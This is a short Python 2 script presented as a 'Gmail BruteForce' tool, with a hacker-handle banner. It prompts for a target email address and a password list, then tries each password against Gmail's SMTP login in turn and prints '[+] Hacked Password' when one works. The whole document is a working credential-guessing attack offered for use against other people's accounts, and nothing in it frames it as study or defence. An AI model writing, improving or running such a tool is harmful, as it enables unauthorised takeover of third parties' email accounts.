#!/usr/bin/python
'''Gmail BruteForce'''

import smtplib
from os import system

def main():
   print '''\033[1;32m
 ____  _ _____ _
/ ___|(_)_   _| |__  _   _
\___ \| | | | | '_ \| | | |
 ___) | | | | | | | | |_| |
|____/|_| |_| |_| |_|\__,_| ~~~~https://www.facebook.com/TimeHacker.1998~~~~ '''

print '\033[1;32m     Gmail Bruteforce  \033[0;35m'


main()
print '[1] start the attack'
print '[2] exit'
option = input('\033[0;33mTimeHacker/rootuser~/>')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] Hacked Password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
